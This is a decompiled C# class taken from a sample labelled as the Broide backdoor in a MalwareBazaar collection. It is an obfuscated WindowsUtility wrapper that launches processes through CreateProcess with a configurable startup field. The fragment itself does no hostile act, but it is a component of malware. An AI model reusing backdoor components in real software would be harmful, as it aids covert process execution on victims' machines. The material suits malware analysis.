// Decompiled with JetBrains decompiler
// Type: fdghdfghdfg.WindowsUtility
// Assembly: rtewsd, Version=1.0.0.23, Culture=neutral, PublicKeyToken=null
// MVID: 26A2B99D-71EF-4F92-906D-8BA9A2FB9EEF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Broide.gen-4409d2170aa9989c6a8dd32b617c51a7c3e328b3c86410813c016691b2bd7774.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace fdghdfghdfg
{
  public static class WindowsUtility
  {
    public static WindowsApi.PROCESS_INFORMATION CreateProcess(
      ProcessStartInfo Param_34,
      string Param_35 = null,
      int? Param_36 = 100)
    {
      WindowsApi.STARTUPINFO structure = new WindowsApi.STARTUPINFO();
      structure.int_8 = Marshal.SizeOf((object) structure);
      structure.string_2 = Param_35;
      WindowsApi.PROCESS_INFORMATION processInformation = new WindowsApi.PROCESS_INFORMATION();
      WindowsApi.PROCESS_INFORMATION process;
      if (!WindowsApi.CreateProcess((string) null, Param_34.FileName + " " + Param_34.Arguments, IntPtr.Zero, IntPtr.Zero, true, 32, IntPtr.Zero, Param_34.WorkingDirectory, ref structure, ref processInformation))
      {
        process = new WindowsApi.PROCESS_INFORMATION();
      }
      else
      {
        if (Param_36.HasValue)
        {
          int num = (int) WindowsApi.WaitForInputIdle(processInformation.int_4, (uint) Param_36.Value);
        }
        WindowsApi.CloseHandle(processInformation.int_5);
        process = processInformation;
      }
      return process;
    }

    public static string GetLastErrorMessage() => new Win32Exception(Marshal.GetLastWin32Error()).Message;
  }
}
